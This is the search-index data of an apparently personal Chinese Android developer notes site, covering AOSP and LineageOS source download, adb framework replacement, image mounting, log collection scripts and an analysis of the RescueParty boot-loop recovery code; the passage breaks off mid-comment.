{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Android10 \u5de5\u4f5c\u518d\u7e41\u5fd9\uff0c\u4eab\u4e00\u65f6\u79d1\u6280\u4e50\u8da3 \u6b22\u8fce\u6765\u5230 droid10 \u3002 droid10 \u6d89\u53caAndroid10\u4f17\u591a\u9886\u57df\uff0c\u5185\u5bb9\u7e41\u6742\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u5f00\u53d1\u6280\u672f\u7684\u53d1\u5c55\u901f\u5ea6\u8d8a\u6765\u8d8a\u5feb\uff0c\u4f18\u8d28\u535a\u5ba2\u7684\u83b7\u53d6\u9700\u8981\u8017\u8d39\u5927\u91cf\u7cbe\u529b\uff0c\u800c\u540c\u65f6\u72ec\u7acb\u535a\u5ba2\u5173\u7ad9\u7684\u6bd4\u4f8b\u8d8a\u6765\u8d8a\u9ad8\u3002 \u4f5c\u4e3a\u4e00\u4e2a\u5c01\u95ed\u7684\u7ad9\u70b9\uff0c\u56f4\u7ed5 \u7231\u597d \u4e0e \u5de5\u4f5c \uff0c droid10 \u5bf9\u5404\u4e2a\u65b9\u5411\u7684\u77e5\u8bc6\u548c\u6280\u672f\u8fdb\u884c\u6574\u7406\uff0c\u4ee5\u4fbf\u4e8e\u81ea\u5df1\u66f4\u597d\u5730\u805a\u7126 \u5de5\u4f5c \u76f8\u5173\u7684\u77e5\u8bc6\u3002","title":"Android10"},{"location":"#android10","text":"","title":"Android10"},{"location":"#_1","text":"\u6b22\u8fce\u6765\u5230 droid10 \u3002 droid10 \u6d89\u53caAndroid10\u4f17\u591a\u9886\u57df\uff0c\u5185\u5bb9\u7e41\u6742\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u5f00\u53d1\u6280\u672f\u7684\u53d1\u5c55\u901f\u5ea6\u8d8a\u6765\u8d8a\u5feb\uff0c\u4f18\u8d28\u535a\u5ba2\u7684\u83b7\u53d6\u9700\u8981\u8017\u8d39\u5927\u91cf\u7cbe\u529b\uff0c\u800c\u540c\u65f6\u72ec\u7acb\u535a\u5ba2\u5173\u7ad9\u7684\u6bd4\u4f8b\u8d8a\u6765\u8d8a\u9ad8\u3002 \u4f5c\u4e3a\u4e00\u4e2a\u5c01\u95ed\u7684\u7ad9\u70b9\uff0c\u56f4\u7ed5 \u7231\u597d \u4e0e \u5de5\u4f5c \uff0c droid10 \u5bf9\u5404\u4e2a\u65b9\u5411\u7684\u77e5\u8bc6\u548c\u6280\u672f\u8fdb\u884c\u6574\u7406\uff0c\u4ee5\u4fbf\u4e8e\u81ea\u5df1\u66f4\u597d\u5730\u805a\u7126 \u5de5\u4f5c \u76f8\u5173\u7684\u77e5\u8bc6\u3002","title":"\u5de5\u4f5c\u518d\u7e41\u5fd9\uff0c\u4eab\u4e00\u65f6\u79d1\u6280\u4e50\u8da3"},{"location":"Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/","text":"\u4e00\u3001\u73af\u5883\u914d\u7f6e Google\u5b98\u65b9\u6587\u6863\uff1a https://source.android.com/setup/build/downloading \u5b89\u88c5Repo\uff1a mkdir ~/bin PATH=~/bin:$PATH curl https://storage.googleapis.com/git-repo-downloads/repo > ~/bin/repo chmod a+x ~/bin/repo \u521d\u59cb\u5316repo\uff1a mkdir WORKING_DIRECTORY cd WORKING_DIRECTORY git config --global user.name \"Your Name\" git config --global user.email \"you@example.com\" \u4ece\u8fd9\u4e2a\u94fe\u63a5 https://source.android.com/setup/start/build-numbers#source-code-tags-and-builds \u83b7\u53d6\u4e00\u4e2a\u5206\u652f\u5730\u5740\uff0c\u4f7f\u7528 repo init \u8fdb\u884c\u521d\u59cb\u5316\u3002\u5f53\u524d\u6700\u65b0\u7684tag\u5206\u652f\u4e3a android-10.0.0_r20 \uff0c\u5982\u4e0b\u56fe\u3002\u6211\u4eec\u4e0b\u8f7d\u6b64\u5206\u652f: \u540c\u6b65android-10.0.0_r20\u4ee3\u7801\uff1a repo init --depth 1 -u https://android.googlesource.com/platform/manifest -b android-10.0.0_r20 repo sync -c -j4 \u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u5f00\u6e90\u8f6f\u4ef6\u955c\u50cf : https://mirrors.ustc.edu.cn/help/aosp.html \u5728~/.bashrc\u4e2d\u914d\u7f6erepo export REPO_URL='https://gerrit-googlesource.proxy.ustclug.org/git-repo' \u540c\u6b65android-security-10.0.0_r66\u4ee3\u7801\uff1a mkdir android10-security-release && cd android10-security-release repo init --depth 1 -u git://mirrors.ustc.edu.cn/aosp/platform/manifest -b android-security-10.0.0_r66 repo sync -c -j4 \u540c\u6b65android-12.1.0_r5\u4ee3\u7801\uff1a mkdir android-12.1.0 && cd android-12.1.0 repo init --depth 1 -u git://mirrors.ustc.edu.cn/aosp/platform/manifest -b android-12.1.0_r5 repo sync -c -j4 \u538b\u7f29\u5206\u4eab\uff1a tar --exclude=\".*\" --exclude=\"out\" -cvf android10-security-release.tar.gz android10-security-release tar --exclude=\".*\" --exclude=\"out\" -cvf android-12.1.0.tar.gz android-12.1.0 \u6e05\u534e\u6e90 :\u3000 https://mirrors.tuna.tsinghua.edu.cn/help/AOSP/ \u540c\u6b65android-security-10.0.0_r66\u4ee3\u7801\uff1a mkdir android10-security-release && cd android10-security-release repo init --depth 1 -u https://mirrors.tuna.tsinghua.edu.cn/git/AOSP/platform/manifest -b android-security-10.0.0_r66 repo sync -c -j4 \u540c\u6b65android-12.1.0_r5\u4ee3\u7801\uff1a mkdir android-12.1.0 && cd android-12.1.0 repo init --depth 1 -u https://mirrors.tuna.tsinghua.edu.cn/git/AOSP/platform/manifest -b android-12.1.0_r5 repo sync -c -j4 \u4e8c\u3001\u4e0b\u8f7dLineageOS-17.1 \u53c2\u8003 https://wiki.lineageos.org/devices/bacon/build \uff1a mkdir Lineage-17.1/ cd Lineage-17.1/ repo init -u https://github.com/LineageOS/android.git -b lineage-17.1 repo sync -c -j8","title":"Android10\u6e90\u7801\u4e0b\u8f7d"},{"location":"Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/#_1","text":"","title":"\u4e00\u3001\u73af\u5883\u914d\u7f6e"},{"location":"Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/#google-httpssourceandroidcomsetupbuilddownloading","text":"\u5b89\u88c5Repo\uff1a mkdir ~/bin PATH=~/bin:$PATH curl https://storage.googleapis.com/git-repo-downloads/repo > ~/bin/repo chmod a+x ~/bin/repo \u521d\u59cb\u5316repo\uff1a mkdir WORKING_DIRECTORY cd WORKING_DIRECTORY git config --global user.name \"Your Name\" git config --global user.email \"you@example.com\" \u4ece\u8fd9\u4e2a\u94fe\u63a5 https://source.android.com/setup/start/build-numbers#source-code-tags-and-builds \u83b7\u53d6\u4e00\u4e2a\u5206\u652f\u5730\u5740\uff0c\u4f7f\u7528 repo init \u8fdb\u884c\u521d\u59cb\u5316\u3002\u5f53\u524d\u6700\u65b0\u7684tag\u5206\u652f\u4e3a android-10.0.0_r20 \uff0c\u5982\u4e0b\u56fe\u3002\u6211\u4eec\u4e0b\u8f7d\u6b64\u5206\u652f: \u540c\u6b65android-10.0.0_r20\u4ee3\u7801\uff1a repo init --depth 1 -u https://android.googlesource.com/platform/manifest -b android-10.0.0_r20 repo sync -c -j4","title":"Google\u5b98\u65b9\u6587\u6863\uff1a https://source.android.com/setup/build/downloading"},{"location":"Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/#httpsmirrorsustceducnhelpaosphtml","text":"\u5728~/.bashrc\u4e2d\u914d\u7f6erepo export REPO_URL='https://gerrit-googlesource.proxy.ustclug.org/git-repo' \u540c\u6b65android-security-10.0.0_r66\u4ee3\u7801\uff1a mkdir android10-security-release && cd android10-security-release repo init --depth 1 -u git://mirrors.ustc.edu.cn/aosp/platform/manifest -b android-security-10.0.0_r66 repo sync -c -j4 \u540c\u6b65android-12.1.0_r5\u4ee3\u7801\uff1a mkdir android-12.1.0 && cd android-12.1.0 repo init --depth 1 -u git://mirrors.ustc.edu.cn/aosp/platform/manifest -b android-12.1.0_r5 repo sync -c -j4 \u538b\u7f29\u5206\u4eab\uff1a tar --exclude=\".*\" --exclude=\"out\" -cvf android10-security-release.tar.gz android10-security-release tar --exclude=\".*\" --exclude=\"out\" -cvf android-12.1.0.tar.gz android-12.1.0","title":"\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u5f00\u6e90\u8f6f\u4ef6\u955c\u50cf : https://mirrors.ustc.edu.cn/help/aosp.html"},{"location":"Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/#httpsmirrorstunatsinghuaeducnhelpaosp","text":"\u540c\u6b65android-security-10.0.0_r66\u4ee3\u7801\uff1a mkdir android10-security-release && cd android10-security-release repo init --depth 1 -u https://mirrors.tuna.tsinghua.edu.cn/git/AOSP/platform/manifest -b android-security-10.0.0_r66 repo sync -c -j4 \u540c\u6b65android-12.1.0_r5\u4ee3\u7801\uff1a mkdir android-12.1.0 && cd android-12.1.0 repo init --depth 1 -u https://mirrors.tuna.tsinghua.edu.cn/git/AOSP/platform/manifest -b android-12.1.0_r5 repo sync -c -j4","title":"\u6e05\u534e\u6e90 :\u3000https://mirrors.tuna.tsinghua.edu.cn/help/AOSP/"},{"location":"Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/#lineageos-171","text":"\u53c2\u8003 https://wiki.lineageos.org/devices/bacon/build \uff1a mkdir Lineage-17.1/ cd Lineage-17.1/ repo init -u https://github.com/LineageOS/android.git -b lineage-17.1 repo sync -c -j8","title":"\u4e8c\u3001\u4e0b\u8f7dLineageOS-17.1"},{"location":"Android/Android%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/","text":"Android\u57fa\u7840\u64cd\u4f5c.md 1 \u5de5\u5177\uff1a \u5f00\u53d1\u5de5\u5177\u7bb1 2 \u7f16\u8bd1\u66ff\u6362 C:\\Users\\hamilton\\Desktop\\file>adb root restarting adbd as root C:\\Users\\hamilton\\Desktop\\file>adb remount remount succeeded C:\\Users\\hamilton\\Desktop\\file>adb push services.jar /system/framework/ .... C:\\Users\\hamilton\\Desktop\\file>adb push framework.jar /system/framework/ C:\\Users\\hamilton\\Desktop\\file>adb shell rm -rf /system/framework/oat/ C:\\Users\\hamilton\\Desktop\\file>adb shell rm -rf /system/framework/arm/ C:\\Users\\hamilton\\Desktop\\file>adb shell rm -rf /system/framework/arm64/ .... C:\\Users\\hamilton\\Desktop\\file>adb push CarService.apk /system/priv-app/CarService/CarService.apk .... C:\\Users\\hamilton\\Desktop\\file>adb push android.hardware.automotive.audiocontrol@1.0-service /vendor/bin/hw/android.hardware.automotive.audiocontrol@1.0-service .... C:\\Users\\hamilton\\Desktop\\file>adb reboot https://blog.csdn.net/superlee1125/article/details/115491698 \u7f16\u8bd1\u51faframework.jar\u540e\uff0c\u5148\u7528\u4e0b\u9762\u7684\u547d\u4ee4remount\uff1a adb root;adb remount \u7136\u540e\u628a framework.jar push\u5230 system/framework/ \u4e0b\u9762\uff0c\u540c\u65f6\u8fd8\u8981 \u5220\u9664 \u8fd9\u4e2a\u76ee\u5f55\u4e0b\u9762\u7684 oat \uff0c arm \uff0c arm64 \u4e09\u4e2a\u76ee\u5f55(\u4e0d\u5220\u9664\u4f1a\u4e00\u76f4\u5361\u5728\u5f00\u673a\u52a8\u753b)\uff0c\u6700\u540e\u518d\u8fd0\u884c\u4e0b\u9762\u7684\u547d\u4ee4\u91cd\u542fzygote\uff0c\u8fd9\u6837\u65b0\u66ff\u6362\u7684 framework.jar \u5c31\u751f\u6548\u4e86\u3002 adb shell stop;adb shell start; \u66ff\u6362\u540e\u7684\u6587\u4ef6\u5728 /mnt/scratch/overlay/ \u4e0b\u9762 D:\\tmp>adb shell ls /mnt/scratch/overlay/ product system vendor 3 \u6302\u8f7dimg\u6587\u4ef6: system.img \u9996\u5148\uff0c\u9700\u8981\u7528 simg2img \u5de5\u5177\u628a system.img \u8f6c\u4e3a\u4e3a ext4 \u6587\u4ef6\u683c\u5f0f\uff0c\u8be5\u5de5\u5177\u4f4d\u4e8e out/host/linux-x86/bin/simg2img \uff0c\u53ef\u4ee5\u4f7f\u7528apt-get\u5b89\u88c5: apt-get install simg2img \u518d\u4f7f\u7528\u5de5\u5177\u8fdb\u884c\u8f6c\u6362\uff1a simg2img system.img system_new.img \u4f1a\u5f97\u5230\u4e00\u4e2a system_new.img \uff0c\u5b83\u662f raw \u683c\u5f0f\u7684\u5b8c\u6574\u955c\u50cf: \u7528Linux\u6302\u8f7d\u547d\u4ee4\u8fdb\u884c\u6302\u8f7d\uff1a sudo mount -t ext4 system_new.img XXX \u6302\u8f7d\u5b8c\u68c0\u67e5\u5168\u7f16\u7684\u955c\u50cf\u4e2d\u662f\u5426\u6709\u81ea\u5df1\u7684apk. super.img \u7f16\u8bd1 lpunpack \u5de5\u5177 (\u751f\u6210\u6587\u4ef6\u6240\u5728\u76ee\u5f55\uff1a out_sys/host/linux-x86/bin ) source build/envsetup.sh make lpunpack \u5c06 super.img \u4ece Android sparse image \u8f6c\u6362\u4e3a raw image simg2img super.img super.img_raw \u4ece raw image \u89e3\u5305\u51fa\u5206\u533a\u955c\u50cf\u6587\u4ef6 ./lpunpack -p system super.img_raw system # \u8fd9\u91cc sytem \u662f\u76ee\u6807\u76ee\u5f55\uff0c\u53ef\u4ee5\u81ea\u5df1\u521b\u5efa \u7528Linux\u6302\u8f7d\u547d\u4ee4\u8fdb\u884c\u6302\u8f7d\uff1a sudo mount -t ext4 system.img XXX 4 \u6293\u65e5\u5fd7 getLogs.bat adb root set d=%date:~0,4%%date:~5,2%%date:~8,2% if %time:~0,2% LEQ 9 (set t=0%time:~1,1%%time:~3,2%%time:~6,2%) else (set t=%time:~0,2%%time:~3,2%%time:~6,2%) echo %d%-%t% mkdir Log-%d%-%t% cd Log-%d%-%t% adb shell ps -A > ps.txt :: ::adb shell am dumpheap 1051 /data/local/tmp/system-server.hprof :: \u5b89\u88c5GitBash, \u5e76\u5c06C:\\Program Files\\Git\\usr\\bin \u52a0\u5230\u73af\u5883\u53d8\u91cf grep system_server ps.txt | awk \"{print $2}\" | xargs -I {} echo adb shell am dumpheap {} /data/local/tmp/system-server.hprof > tmp.bat echo adb pull /data/local/tmp/system-server.hprof >> tmp.bat echo adb shell rm /data/local/tmp/system-server.hprof >> tmp.bat grep mediaserver ps.txt | awk \"{print $2}\" |xargs -I {} echo adb shell debuggerd -b {} \"> mediaserver.txt\" >> tmp.bat echo exit >> tmp.bat start tmp.bat cat tmp.bat adb pull /data/log adb pull /data/anr adb pull /data/tombstones adb pull /data/system/dropbox adb pull /sys/kernel/debug/binder md _dump cd _dump adb shell uiautomator dump /data/local/tmp/app.uix adb pull /data/local/tmp/app.uix adb shell screencap -p /sdcard/app.png adb pull /sdcard/app.png adb shell top -n 1 > top.txt adb shell free -m > free.txt adb shell procrank > procrank.txt adb shell dumpsys > dumpsys.txt adb shell dumpsys car_service > dumpsys_car_service.txt adb shell dumpsys meminfo system_server > system_server_mem.txt adb shell dumpsys meminfo mediaserver > mediaserver_mem.txt adb shell dmesg > dmsg.txt cd .. adb shell perfetto -o /data/misc/perfetto-traces/trace_file.perfetto-trace -t 30s sched freq idle am wm gfx view binder_driver hal dalvik camera input res memory adb pull /data/misc/perfetto-traces/trace_file.perfetto-trace del tmp.bat cd .. pause Systrace \u7b80\u4ecb adb shell perfetto -o /data/misc/perfetto-traces/trace_file.perfetto-trace -t 20s sched freq idle am wm gfx view binder_driver hal dalvik camera input res memory \u7f51\u7ad9: https://ui.perfetto.dev/#!/ \u505a\u7cfb\u7edf\u7a33\u5b9a\u6027\u95ee\u9898\u5206\u6790\uff0c\u5f53\u9047\u5230\u7cfb\u7edf\u5361\u6b7b\u65f6\uff0c\u6211\u4eec\u7ecf\u5e38\u8981\u4f7f\u7528\u201ckill -3 pid\u201d\u6765\u6253\u5370System_Server\u8fdb\u7a0b\u5404\u4e2a\u7ebf\u7a0b\u7684Java\u8c03\u7528\u6808\uff0c\u6839\u636e\u7ebf\u7a0b\u72b6\u6001\u53ca\u8c03\u7528\u6808\u6765\u66f4\u8fdb\u4e00\u6b65\u5b9a\u4f4d\u95ee\u9898\u70b9\uff0c\u5f53\u7136\u67d0\u4e2a\u5e94\u8be5\u754c\u9762\u5361\u987f\u65f6\u95f4\u957f\u65f6\u4e5f\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u547d\u4ee4\u6765\u6293\u53d6Java\u8c03\u7528\u6808\u8fdb\u884c\u5206\u6790\u3002 \u6ce8\u610fnative\u8fdb\u7a0b\u662f\u4e0d\u80fd\u7528kill -3\u6765\u6253trace\u7684\uff0c\u800c\u662f\u4f7f\u7528debuggerd. adb shell dumpsys car_service --help adb shell dumpsys car_service --services CarAudioService > CarAudioService.txt # dump CarAudioService","title":"Android\u57fa\u7840\u64cd\u4f5c"},{"location":"Android/Android%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/#1","text":"","title":"1 \u5de5\u5177\uff1a\u5f00\u53d1\u5de5\u5177\u7bb1"},{"location":"Android/Android%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/#2","text":"C:\\Users\\hamilton\\Desktop\\file>adb root restarting adbd as root C:\\Users\\hamilton\\Desktop\\file>adb remount remount succeeded C:\\Users\\hamilton\\Desktop\\file>adb push services.jar /system/framework/ .... C:\\Users\\hamilton\\Desktop\\file>adb push framework.jar /system/framework/ C:\\Users\\hamilton\\Desktop\\file>adb shell rm -rf /system/framework/oat/ C:\\Users\\hamilton\\Desktop\\file>adb shell rm -rf /system/framework/arm/ C:\\Users\\hamilton\\Desktop\\file>adb shell rm -rf /system/framework/arm64/ .... C:\\Users\\hamilton\\Desktop\\file>adb push CarService.apk /system/priv-app/CarService/CarService.apk .... C:\\Users\\hamilton\\Desktop\\file>adb push android.hardware.automotive.audiocontrol@1.0-service /vendor/bin/hw/android.hardware.automotive.audiocontrol@1.0-service .... C:\\Users\\hamilton\\Desktop\\file>adb reboot https://blog.csdn.net/superlee1125/article/details/115491698 \u7f16\u8bd1\u51faframework.jar\u540e\uff0c\u5148\u7528\u4e0b\u9762\u7684\u547d\u4ee4remount\uff1a adb root;adb remount \u7136\u540e\u628a framework.jar push\u5230 system/framework/ \u4e0b\u9762\uff0c\u540c\u65f6\u8fd8\u8981 \u5220\u9664 \u8fd9\u4e2a\u76ee\u5f55\u4e0b\u9762\u7684 oat \uff0c arm \uff0c arm64 \u4e09\u4e2a\u76ee\u5f55(\u4e0d\u5220\u9664\u4f1a\u4e00\u76f4\u5361\u5728\u5f00\u673a\u52a8\u753b)\uff0c\u6700\u540e\u518d\u8fd0\u884c\u4e0b\u9762\u7684\u547d\u4ee4\u91cd\u542fzygote\uff0c\u8fd9\u6837\u65b0\u66ff\u6362\u7684 framework.jar \u5c31\u751f\u6548\u4e86\u3002 adb shell stop;adb shell start; \u66ff\u6362\u540e\u7684\u6587\u4ef6\u5728 /mnt/scratch/overlay/ \u4e0b\u9762 D:\\tmp>adb shell ls /mnt/scratch/overlay/ product system vendor","title":"2 \u7f16\u8bd1\u66ff\u6362"},{"location":"Android/Android%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/#3-img","text":"","title":"3 \u6302\u8f7dimg\u6587\u4ef6:"},{"location":"Android/Android%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/#systemimg","text":"\u9996\u5148\uff0c\u9700\u8981\u7528 simg2img \u5de5\u5177\u628a system.img \u8f6c\u4e3a\u4e3a ext4 \u6587\u4ef6\u683c\u5f0f\uff0c\u8be5\u5de5\u5177\u4f4d\u4e8e out/host/linux-x86/bin/simg2img \uff0c\u53ef\u4ee5\u4f7f\u7528apt-get\u5b89\u88c5: apt-get install simg2img \u518d\u4f7f\u7528\u5de5\u5177\u8fdb\u884c\u8f6c\u6362\uff1a simg2img system.img system_new.img \u4f1a\u5f97\u5230\u4e00\u4e2a system_new.img \uff0c\u5b83\u662f raw \u683c\u5f0f\u7684\u5b8c\u6574\u955c\u50cf: \u7528Linux\u6302\u8f7d\u547d\u4ee4\u8fdb\u884c\u6302\u8f7d\uff1a sudo mount -t ext4 system_new.img XXX \u6302\u8f7d\u5b8c\u68c0\u67e5\u5168\u7f16\u7684\u955c\u50cf\u4e2d\u662f\u5426\u6709\u81ea\u5df1\u7684apk.","title":"system.img"},{"location":"Android/Android%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/#superimg","text":"\u7f16\u8bd1 lpunpack \u5de5\u5177 (\u751f\u6210\u6587\u4ef6\u6240\u5728\u76ee\u5f55\uff1a out_sys/host/linux-x86/bin ) source build/envsetup.sh make lpunpack \u5c06 super.img \u4ece Android sparse image \u8f6c\u6362\u4e3a raw image simg2img super.img super.img_raw \u4ece raw image \u89e3\u5305\u51fa\u5206\u533a\u955c\u50cf\u6587\u4ef6 ./lpunpack -p system super.img_raw system # \u8fd9\u91cc sytem \u662f\u76ee\u6807\u76ee\u5f55\uff0c\u53ef\u4ee5\u81ea\u5df1\u521b\u5efa \u7528Linux\u6302\u8f7d\u547d\u4ee4\u8fdb\u884c\u6302\u8f7d\uff1a sudo mount -t ext4 system.img XXX","title":"super.img"},{"location":"Android/Android%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/#4","text":"getLogs.bat adb root set d=%date:~0,4%%date:~5,2%%date:~8,2% if %time:~0,2% LEQ 9 (set t=0%time:~1,1%%time:~3,2%%time:~6,2%) else (set t=%time:~0,2%%time:~3,2%%time:~6,2%) echo %d%-%t% mkdir Log-%d%-%t% cd Log-%d%-%t% adb shell ps -A > ps.txt :: ::adb shell am dumpheap 1051 /data/local/tmp/system-server.hprof :: \u5b89\u88c5GitBash, \u5e76\u5c06C:\\Program Files\\Git\\usr\\bin \u52a0\u5230\u73af\u5883\u53d8\u91cf grep system_server ps.txt | awk \"{print $2}\" | xargs -I {} echo adb shell am dumpheap {} /data/local/tmp/system-server.hprof > tmp.bat echo adb pull /data/local/tmp/system-server.hprof >> tmp.bat echo adb shell rm /data/local/tmp/system-server.hprof >> tmp.bat grep mediaserver ps.txt | awk \"{print $2}\" |xargs -I {} echo adb shell debuggerd -b {} \"> mediaserver.txt\" >> tmp.bat echo exit >> tmp.bat start tmp.bat cat tmp.bat adb pull /data/log adb pull /data/anr adb pull /data/tombstones adb pull /data/system/dropbox adb pull /sys/kernel/debug/binder md _dump cd _dump adb shell uiautomator dump /data/local/tmp/app.uix adb pull /data/local/tmp/app.uix adb shell screencap -p /sdcard/app.png adb pull /sdcard/app.png adb shell top -n 1 > top.txt adb shell free -m > free.txt adb shell procrank > procrank.txt adb shell dumpsys > dumpsys.txt adb shell dumpsys car_service > dumpsys_car_service.txt adb shell dumpsys meminfo system_server > system_server_mem.txt adb shell dumpsys meminfo mediaserver > mediaserver_mem.txt adb shell dmesg > dmsg.txt cd .. adb shell perfetto -o /data/misc/perfetto-traces/trace_file.perfetto-trace -t 30s sched freq idle am wm gfx view binder_driver hal dalvik camera input res memory adb pull /data/misc/perfetto-traces/trace_file.perfetto-trace del tmp.bat cd .. pause Systrace \u7b80\u4ecb adb shell perfetto -o /data/misc/perfetto-traces/trace_file.perfetto-trace -t 20s sched freq idle am wm gfx view binder_driver hal dalvik camera input res memory \u7f51\u7ad9: https://ui.perfetto.dev/#!/ \u505a\u7cfb\u7edf\u7a33\u5b9a\u6027\u95ee\u9898\u5206\u6790\uff0c\u5f53\u9047\u5230\u7cfb\u7edf\u5361\u6b7b\u65f6\uff0c\u6211\u4eec\u7ecf\u5e38\u8981\u4f7f\u7528\u201ckill -3 pid\u201d\u6765\u6253\u5370System_Server\u8fdb\u7a0b\u5404\u4e2a\u7ebf\u7a0b\u7684Java\u8c03\u7528\u6808\uff0c\u6839\u636e\u7ebf\u7a0b\u72b6\u6001\u53ca\u8c03\u7528\u6808\u6765\u66f4\u8fdb\u4e00\u6b65\u5b9a\u4f4d\u95ee\u9898\u70b9\uff0c\u5f53\u7136\u67d0\u4e2a\u5e94\u8be5\u754c\u9762\u5361\u987f\u65f6\u95f4\u957f\u65f6\u4e5f\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2a\u547d\u4ee4\u6765\u6293\u53d6Java\u8c03\u7528\u6808\u8fdb\u884c\u5206\u6790\u3002 \u6ce8\u610fnative\u8fdb\u7a0b\u662f\u4e0d\u80fd\u7528kill -3\u6765\u6253trace\u7684\uff0c\u800c\u662f\u4f7f\u7528debuggerd. adb shell dumpsys car_service --help adb shell dumpsys car_service --services CarAudioService > CarAudioService.txt # dump CarAudioService","title":"4 \u6293\u65e5\u5fd7"},{"location":"Android/%E6%81%A2%E5%A4%8D%E6%A8%A1%E5%BC%8F/","text":"0 \u7ed3\u8bba: Demo \u5e94\u8be5\u5982\u4f55\u5199 Demo \u5e94\u8be5\u5728 1\u5206\u949f \u5185\u81f3\u5c11\u6302\u6389 5\u6b21 RescueParty \u5e94\u8be5\u5408\u5165\u4fee\u590d\u4ee3\u7801, \u5426\u5219\u4e0d\u80fd\u8fdb\u5165 recovery (\u5426\u5219 mayObservePackage \u8fd4\u56de\u5931\u8d25) Demo \u5e94\u8be5\u662f android:persistent=\"true\" \u7684, (\u5426\u5219 mayObservePackage \u8fd4\u56de\u5931\u8d25) \u4e0d\u8981\u5b58\u5728 adb \u8fde\u63a5, \u5426\u5219\u5224\u65ad\u662f\u7528\u6237\u5728\u8c03\u8bd5.( isDisabled \u5224\u65ad\u6210\u529f, \u7528\u6237\u8c03\u8bd5) Demo \u4ee3\u7801: <application ... android:name=\".CrashApp\" android:persistent=\"true\"> public class CrashApp extends Application { boolean flag = true; @Override public final void onCreate() { super.onCreate(); new Handler().postDelayed(new Runnable() { @Override public void run() { Log.e(\"==>\", \"1/0 = \" + (flag ? 1/0 : 1/1) ); } }, 100); } } 1 \u76d1\u542cSystemServer\u5d29\u6e83 SystemServer\u4e2d, RescueParty\u6ce8\u518c\u76d1\u542c\u5668, \u5e76\u542f\u52a8PackageWatchdog, \u5982\u679c\u6bcf\u6b21 10ms \u5185 system server \u53d1\u751f\u9519\u8bef, \u8fde\u7eed\u53d1\u751f\u4e86 \u5927\u4e8e\u7b49\u4e8e5\u6b21 , \u5219\u6267\u884c executeBootLoopMitigation \u5982\u679cAPP\u53d1\u751f\u4e86\u7cdf\u7cd5\u7684\u5d29\u6e83, \u5219\u6267\u884c execute http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/java/com/android/server/SystemServer.java 710 private void startBootstrapServices(@NonNull TimingsTraceAndSlog t) { 711 t.traceBegin(\"startBootstrapServices\"); ... 802 // Bring up recovery system in case a rescue party needs a reboot 803 t.traceBegin(\"StartRecoverySystemService\"); 804 mSystemServiceManager.startService(RecoverySystemService.Lifecycle.class); 805 t.traceEnd(); 806 807 // Now that we have the bare essentials of the OS up and running, take 808 // note that we just booted, which might send out a rescue party if 809 // we're stuck in a runtime restart loop. 810 RescueParty.registerHealthObserver(mSystemContext); 811 PackageWatchdog.getInstance(mSystemContext).noteBoot(); 1013 /** 1014 * Starts a miscellaneous grab bag of stuff that has yet to be refactored and organized. 1015 */ 1016 private void startOtherServices(@NonNull TimingsTraceAndSlog t) { 1017 t.traceBegin(\"startOtherServices\"); 1121 t.traceBegin(\"InstallSystemProviders\"); 1122 mActivityManagerService.installSystemProviders(); 1123 // Now that SettingsProvider is ready, reactivate SQLiteCompatibilityWalFlags 1124 SQLiteCompatibilityWalFlags.reset(); 1125 t.traceEnd(); http://www.aospxref.com/android-11.0.0_r21/xref/frameworks/base/services/core/java/com/android/server/PackageWatchdog.java 123 static final int DEFAULT_BOOT_LOOP_TRIGGER_COUNT = 5; 124 static final long DEFAULT_BOOT_LOOP_TRIGGER_WINDOW_MS = TimeUnit.MINUTES.toMillis(10); 206 PackageWatchdog(Context context, AtomicFile policyFile, Handler shortTaskHandler, 207 Handler longTaskHandler, ExplicitHealthCheckController controller, 208 ConnectivityModuleConnector connectivityModuleConnector, SystemClock clock) { 209 mContext = context; 210 mPolicyFile = policyFile; 211 mShortTaskHandler = shortTaskHandler; 212 mLongTaskHandler = longTaskHandler; 213 mHealthCheckController = controller; 214 mConnectivityModuleConnector = connectivityModuleConnector; 215 mSystemClock = clock; 216 mNumberOfNativeCrashPollsRemaining = NUMBER_OF_NATIVE_CRASH_POLLS; 217 mBootThreshold = new BootThreshold(DEFAULT_BOOT_LOOP_TRIGGER_COUNT, 218 DEFAULT_BOOT_LOOP_TRIGGER_WINDOW_MS); 219 loadFromFile(); 220 sPackageWatchdog = this; 221 } 222 442 /** 443 * Called when the system server boots. If the system server is detected to be in a boot loop, 444 * query each observer and perform the mitigation action with the lowest user impact. 445 */ 446 public void noteBoot() { 447 synchronized (mLock) { 448 if (mBootThreshold.incrementAndTest()) { 449 mBootThreshold.reset(); 450 PackageHealthObserver currentObserverToNotify = null; 451 int currentObserverImpact = Integer.MAX_VALUE; 452 for (int i = 0; i < mAllObservers.size(); i++) { 453 final ObserverInternal observer = mAllObservers.valueAt(i); 454 PackageHealthObserver registeredObserver = observer.registeredObserver; 455 if (registeredObserver != null) { 456 int impact = registeredObserver.onBootLoop(); 457 if (impact != PackageHealthObserverImpact.USER_IMPACT_NONE 458 && impact < currentObserverImpact) { 459 currentObserverToNotify = registeredObserver; 460 currentObserverImpact = impact; 461 } 462 } 463 } 464 if (currentObserverToNotify != null) { 465 currentObserverToNotify.executeBootLoopMitigation(); 466 } 467 } 468 } 469 } /** 1463 * Handles the thresholding logic for system server 